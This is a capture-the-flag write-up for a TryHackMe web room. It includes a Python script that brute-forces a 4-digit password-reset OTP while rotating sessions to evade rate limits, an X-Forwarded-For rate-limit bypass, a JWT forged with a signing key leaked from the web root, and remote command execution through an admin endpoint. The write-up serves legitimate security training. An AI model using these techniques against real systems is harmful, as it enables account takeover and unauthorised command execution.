---
title: "Hammer"
ctf: "TryHackMe"
date: "2026-08-06"
description: "Authentication bypass via OTP brute force and JWT privilege escalation using an exposed signing key."
points: 0
views: 0
tags: ["Web", "JWT", "Authentication", "OTP", "Medium"]
---

## Summary

Hammer is a web challenge focused on authentication flaws. The attack chain involves:

1. Reconnaissance to find exposed log files and a developer comment leaking a directory naming convention
2. Extracting a valid email from error logs
3. Brute forcing a 4-digit OTP with rate limit bypass to reset the password
4. Logging in and finding a JWT-protected command execution endpoint
5. Forging a JWT with `role: admin` using a key file exposed in the web root to gain full command execution

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -T5 --min-rate=5000 -p- 10.49.174.56 -oA hammer_recon
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:\
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Port 1337 - classic CTF trolling. The `PHPSESSID` cookie immediately tells you it's PHP, and the missing `httponly` flag on that session cookie is something worth bookmarking for later.

**Key observations:**
- Port 1337 running a PHP app (identified by `PHPSESSID` cookie)
- `httponly` flag not set on session cookie - XSS would steal sessions directly
- Login page at `/index.php`

---

### Directory Enumeration

```bash
dirsearch -u http://10.49.174.56:1337
```

```
[200] /composer.json
[200] /config.php          (0 bytes - PHP executes it)
[302] /dashboard.php       -> logout.php (auth required)
[301] /javascript
[301] /phpmyadmin/
[200] /phpmyadmin/index.php
[200] /vendor/composer/installed.json
```

Checking `installed.json` revealed the app uses **`firebase/php-jwt v6.10.0`** - confirming JWT-based authentication. Good to know early, this already hints at where the second half of the room is headed.

### Developer Comment in Page Source

Always worth checking the page source before you start fuzzing anything. In this case it paid off immediately - viewing source of `index.php` (`Ctrl+U`) revealed:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Fuzzing for `hmr_*` directories:

```bash
ffuf -u http://10.49.174.56:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```

```
css       [301]
images    [301]
js        [301]
logs      [301]   <- interesting
```

---

## Information Disclosure - Error Logs

Navigating to `http://10.49.174.56:1337/hmr_logs/` revealed a directory listing with `error.logs`. Directory listing enabled on a logs folder - this is going to be good.

```
http://10.49.174.56:1337/hmr_logs/error.logs
```

The logs contained:

```
[authz_core:error] ... user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[authz_core:error] ... user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
```

**Valid email found:** `tester@hammer.thm`

A real application would never expose authentication errors in a publicly accessible log file. This one line saves us the entire step of username enumeration.

---

## Authentication Bypass - OTP Brute Force

### Password Reset Flow

Navigating to `reset_password.php` and submitting `tester@hammer.thm` triggered a 4-digit OTP prompt with a countdown timer (~180 seconds).

**Attack surface:**
- 4-digit OTP = 10,000 possible combinations
- Rate limit of 9 attempts per session (tracked via `Rate-Limit-Pending` response header)
- New session = rate limit reset

**Rate limit bypass:** The rate limit is tied to `PHPSESSID`, not to an IP or account - meaning every fresh session gets a fresh counter. POSTing the email to the reset endpoint without a cookie gives you a new session. Rotating sessions every 7 requests stays safely under the 9-attempt ceiling.

This is the crux of the whole bypass - the rate limit exists, it just isn't implemented at the right layer.

### Brute Force Script

```python
import requests

url = "http://hammer.thm:1337/reset_password.php"

def get_fresh_session():
    s = requests.Session()
    r = s.post(url, data={"email": "tester@hammer.thm"})
    return s

s = get_fresh_session()

# fingerprint wrong response
wrong = s.post(url, data={"recovery_code": "9999", "s": "180"})
wrong_wc = len(wrong.text.split())
print(f"[*] Wrong code word count: {wrong_wc}")

for i in range(10000):
    code = f"{i:04d}"
    if i % 7 == 0 and i != 0:
        s = get_fresh_session()
        print(f"[*] New session at {code}: {s.cookies.get('PHPSESSID')}")

    r = s.post(url, data={"recovery_code": code, "s": "180"})
    wc = len(r.text.split())

    if wc != wrong_wc:
        print(f"\n[+] OTP FOUND: {code}")
        print(f"[+] PHPSESSID: {s.cookies.get('PHPSESSID')}")
        break

    if i % 200 == 0:
        print(f"[-] {i}/10000")
```

### Completing the Reset

Once the OTP was found, the password reset POST was sent via Burp Repeater with `X-Forwarded-For` to bypass the rate limit on the final submission:

```
POST /reset_password.php HTTP/1.1
Host: 10.49.174.56:1337
Cookie: PHPSESSID=<session_from_script>
X-Forwarded-For: 10.10.10.99
Content-Type: application/x-www-form-urlencoded

new_password=admin123&confirm_password=admin123
```

**Response:**
```
HTTP/1.1 302 Found
Location: index.php

Password has been reset successfully!
```

---

## Flag 1

Logging in with `tester@hammer.thm` / `admin123` at `http://10.49.174.56:1337`:

```
Welcome, Thor! - Flag: THM{***REDACTED***}
Your role: user
```

**Flag 1: `THM{***REDACTED***}`**

Half done - but the `role: user` on the dashboard is screaming at you to keep going.

---

## JWT Exploitation - Privilege Escalation to Admin

### Analyzing the JWT

The login response set a JWT token cookie. Decoding it at [jwt.io](https://jwt.io):

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

**Payload:**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1786018753,
  "exp": 1786022353,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The `kid` (Key ID) parameter points to a file path on the server - `/var/www/mykey.key` - used to verify the JWT signature. An absolute file path in a JWT header is a serious design flaw. This is essentially the server telling you where it keeps its signing key.

### Finding the Key File

The dashboard's command box (role: user) only allowed `ls`, which revealed:

```
[REDACTED].key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor
```

The actual key file `[REDACTED].key` was in the web root and directly accessible - no auth, no restriction, just served like a static asset:

```bash
curl http://10.49.174.56:1337/[REDACTED].key
```

```
[REDACTED_KEY]
```

### Forging the JWT

With the signing key in hand, forging a JWT with elevated privileges is straightforward. The only thing to get right is updating `kid` to point to the actual path of the key file we just found - not the `/var/www/mykey.key` path from the original token, but the full web root path where `[REDACTED].key` actually lives:

```python
import jwt

secret = "[REDACTED_KEY]"

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1786020335,
    "exp": 9999999999,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

headers = {
    "kid": "/var/www/html/[REDACTED].key"
}

token = jwt.encode(payload, secret, algorithm="HS256", headers=headers)
print(token)
```

```bash
pip install pyjwt --break-system-packages
python3 forge.py
```

### Executing Commands as Admin

The forged token was used in Burp Repeater against `/execute_command.php`:

```
POST /execute_command.php HTTP/1.1
Host: 10.49.174.56:1337
Authorization: Bearer <forged_token>
Cookie: PHPSESSID=<session>; token=<forged_token>; persistentSession=no
Content-Type: application/json

{"command":"cat /home/ubuntu/flag.txt"}
```

**Response:**
```json
{
  "output": "THM{***REDACTED***}\n"
}
```

---

## Flag 2

**Flag 2: `THM{***REDACTED***}`**

---

## Vulnerability Summary

| Vulnerability | Impact |
|---|---|
| Exposed error logs (`/hmr_logs/error.logs`) | Valid email enumeration |
| Developer comment leaking directory convention | Exposed hidden directories |
| Missing OTP rate limiting (per session) | OTP brute force via session rotation |
| `X-Forwarded-For` trusted for rate limiting | Rate limit bypass on password reset |
| JWT `kid` pointing to web-accessible file | Signing key disclosure |
| Signing key exposed in web root | JWT forgery and privilege escalation |
| Role-based command filter bypassable via JWT | Remote command execution as admin |

---

## Tools Used

- `nmap` - port scanning
- `dirsearch` - directory enumeration
- `ffuf` - fuzzing `hmr_*` directories
- `Burp Suite` - request interception and replay
- Python `requests` - OTP brute force
- Python `pyjwt` - JWT forging
